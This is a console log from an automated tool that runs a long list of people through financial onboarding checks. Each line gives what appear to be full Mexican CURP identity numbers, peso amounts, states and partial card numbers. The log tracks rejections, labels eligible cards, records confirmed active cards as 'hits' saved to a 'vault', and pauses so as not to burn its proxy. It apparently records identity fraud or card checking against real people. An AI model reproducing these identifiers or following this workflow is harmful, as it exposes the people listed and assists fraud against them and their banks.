[2977] ID:246080 | EUFS690712HJCSLL07 | $169,590 | JALISCO | T:3042... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[2978] ID:4170038 | FOAJ691016HMCLGS05 | $169,580 | ESTADO DE ME | T:0599... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (9.8s)
[2979] ID:11946 | GUMT690323HMCNRR09 | $169,540 | ESTADO DE ME | T:0263... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.2s)
[2980] ID:2695939 | RICA730912MMCVSN07 | $169,540 | ESTADO DE ME | T:1813... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2981] ID:2181538 | AUAO760825MNTGLD09 | $169,500 | NAYARIT | T:9996... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[2982] ID:4554863 | ROAS781219MNLDLC01 | $169,500 | NUEVO LEON | T:1185... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[2983] ID:1914934 | RARA690409HTCMML03 | $169,490 | TABASCO | T:0050... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.2s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0050 para ID:1914934 ($169,490)... [2984] ID:1779083 | RUTM730717HDFNLR02 | $169,480 | CIUDAD DE ME | T:6176... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.2s)
[2985] ID:4438942 | AIMJ720715HZSVRN08 | $169,480 | ZACATECAS | T:1474... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (12.9s)
[2986] ID:4095914 | BAOS750729HHGCLR07 | $169,460 | HIDALGO | T:7081... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.5s)
[2987] ID:4831554 | MACI760821HDFSVV03 | $169,460 | CIUDAD DE ME | T:2263... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1474 para ID:4438942 ($169,480)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2988] ID:31723 | MERJ690105HDFNDN03 | $169,400 | CIUDAD DE ME | T:3889... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2989] ID:57957 | GOCR720324HDFNZM00 | $169,400 | CIUDAD DE ME | T:8808... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.6s)
[2990] ID:278182 | GASL760921HCGRCS08 | $169,400 | COAHUILA | T:9473... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2991] ID:729560 | MUMG750703HVRNNB00 | $169,400 | VERACRUZ | T:6743... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.0s)
[2992] ID:2040891 | VAMR710812MDGQRS08 | $169,400 | DURANGO | T:6997... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8808 para ID:57957 ($169,400)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2993] ID:3845030 | VEAI770908HGRGLG08 | $169,400 | GUERRERO | T:9602... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[2994] ID:4418926 | TOHC770711HCSLRS00 | $169,400 | CHIAPAS | T:8025... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (12.0s)
[2995] ID:218703 | ROME700513HDFNCN00 | $169,350 | CIUDAD DE ME | T:0936... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2996] ID:3490914 | AALE730217MJCLPN03 | $169,350 | JALISCO | T:2697... [🔴 OFF] Rechazo bancario (PE170) (15.3s)
[2997] ID:4214109 | GAGA700918MMSRMN06 | $169,350 | MORELOS | T:5923... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2998] ID:4449007 | RUER711124HNLZSL03 | $169,320 | NUEVO LEON | T:4547... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.5s)
[2999] ID:654225 | BEHG700827MJCCRD01 | $169,260 | JALISCO | T:5393... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[3000] ID:1005315 | RACJ700815HNLMHN08 | $169,260 | NUEVO LEON | T:8103... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.1s)
[3001] ID:3135378 | TERN770223MCSRZN04 | $169,230 | CHIAPAS | T:1632... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.5s)
[3002] ID:172010 | ROPM690525MTSCRN03 | $169,210 | TAMAULIPAS | T:0470... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5393 para ID:654225 ($169,260)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.8s)
[3003] ID:367740 | RERJ690127HCHYVN06 | $169,200 | CHIHUAHUA | T:8037... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE020) (14.0s)
[3004] ID:1548144 | LUMA740913HNLMDR08 | $169,200 | NUEVO LEON | T:4361... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1632 para ID:3135378 ($169,230)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.7s)
[3005] ID:302981 | OAGB691203MTSLXB03 | $169,170 | TAMAULIPAS | T:4564... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE1002) (11.5s)
[3006] ID:2074733 | SAPG690831MDFNRD01 | $169,170 | CIUDAD DE ME | T:1361... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8037 para ID:367740 ($169,200)... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[3007] ID:1457758 | ROCA770206HNLDVL05 | $169,160 | NUEVO LEON | T:0246... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.8s)
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (20.2s)
[3008] ID:4578758 | PEAG711229MJCRRD06 | $169,100 | JALISCO | T:6733... [3009] ID:4484691 | RAPA831002MJCMRN07 | $169,080 | JALISCO | T:4172... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1361 para ID:2074733 ($169,170)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.7s)
[3010] ID:4708631 | NAAF740104HDFVRR01 | $169,060 | CIUDAD DE ME | T:0534... [🔴 OFF] Contacto preexistente (/confirm-contact) (11.2s)
[3011] ID:1122608 | EICA711119HTSNMD03 | $169,050 | TAMAULIPAS | T:9643... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0246 para ID:1457758 ($169,160)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (17.8s)
[3012] ID:1354944 | WIFP720214MMSLNL04 | $169,040 | MORELOS | T:3866... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.9s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[3013] ID:2535180 | ROCR691003MDFSRR01 | $169,030 | CIUDAD DE ME | T:6497... [3014] ID:542856 | SACF730221HNLNMR03 | $169,000 | NUEVO LEON | T:7178... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[3015] ID:548249 | CALL741128HNLBLS09 | $169,000 | NUEVO LEON | T:1205... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.2s)
[3016] ID:597375 | AIGD701226MHGRNL01 | $169,000 | HIDALGO | T:7726... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7178 para ID:542856 ($169,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[3017] ID:597635 | RAGC700621MBCMLY03 | $169,000 | BAJA CALIFOR | T:5244... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.5s)
[3018] ID:610946 | GAEA780106HNLRSR08 | $169,000 | NUEVO LEON | T:5256... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1205 para ID:548249 ($169,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.1s)
[3019] ID:640924 | FOMD750626MMCLRM00 | $169,000 | ESTADO DE ME | T:4202... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[3020] ID:721963 | MAML700313MJCRRZ08 | $169,000 | JALISCO | T:0834... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[3021] ID:798760 | VEIS691119MSOLBY05 | $169,000 | SONORA | T:4566... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[3022] ID:949496 | MACA710702HCGCRR04 | $169,000 | COAHUILA | T:1148... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[3023] ID:1022150 | TOVC741101HCGRRR09 | $169,000 | COAHUILA | T:1621... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.6s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0834 para ID:721963 ($169,000)... [3024] ID:1142134 | GAJA701124MGRRRN04 | $169,000 | GUERRERO | T:7619... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[3025] ID:1183071 | CUMA730802MJCRRR05 | $169,000 | JALISCO | T:6173... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[3026] ID:1197043 | CAVE760229HDFSLR03 | $169,000 | CIUDAD DE ME | T:2172... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[3027] ID:1333038 | PAVF740908HDFLLR04 | $169,000 | CIUDAD DE ME | T:5718... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[3028] ID:1448300 | CAHE721123HVRCRR04 | $169,000 | VERACRUZ | T:8944... [🔴 OFF] Rechazo bancario (PE170) (14.2s)
[3029] ID:1598139 | CAVJ690701MCHHZL06 | $169,000 | CHIHUAHUA | T:4073... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.7s)
[3030] ID:1832780 | SEAG741211MBSVCD03 | $169,000 | BAJA CALIFOR | T:7590... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.2s)
[3031] ID:1950045 | AAVA700603HGTLRX00 | $169,000 | GUANAJUATO | T:2177... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.5s)
[3032] ID:2026905 | LEFR710809HTSNNM01 | $169,000 | TAMAULIPAS | T:5974... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[3033] ID:2097070 | CAEJ760421HMCHSR09 | $169,000 | ESTADO DE ME | T:1433... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[3034] ID:2102841 | GOER741122HCSNSD08 | $169,000 | CHIAPAS | T:2333... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[3035] ID:2463577 | GATJ730122HASLBN03 | $169,000 | AGUASCALIENT | T:9227... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.3s)
[3036] ID:2664990 | GAOA700320HASLRN05 | $169,000 | AGUASCALIENT | T:4741... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[3037] ID:2750891 | GAVG710414HDFRRB07 | $169,000 | CIUDAD DE ME | T:9344... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[3038] ID:2765146 | PAMS750322MJCCNS01 | $169,000 | JALISCO | T:0986... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.8s)
[3039] ID:3045824 | MEAH740425HCPDVC07 | $169,000 | CAMPECHE | T:5096... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.7s)
[3040] ID:3159740 | LOJC690210MJCZML08 | $169,000 | JALISCO | T:6944... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9344 para ID:2750891 ($169,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[3041] ID:3434027 | GAJR690625HDFLMD07 | $169,000 | CIUDAD DE ME | T:0432... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE110) (15.0s)
[3042] ID:3436762 | GOPP710111MJCMDT07 | $169,000 | JALISCO | T:8318... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (18.8s)
[3043] ID:3471503 | HEAF710522HNTRCR08 | $169,000 | NAYARIT | T:1060... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0432 para ID:3434027 ($169,000)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.8s)
[3044] ID:3506919 | CAAS761104HBCRRL04 | $169,000 | BAJA CALIFOR | T:4058... [🟢 HIT #15] Tarjeta ACTIVA Confirmada -> Guardado en bóveda!
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)

[⏸️] Pool de hits en 15 (>= 15). Pausando onboarding para no quemar proxy.
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.1s)
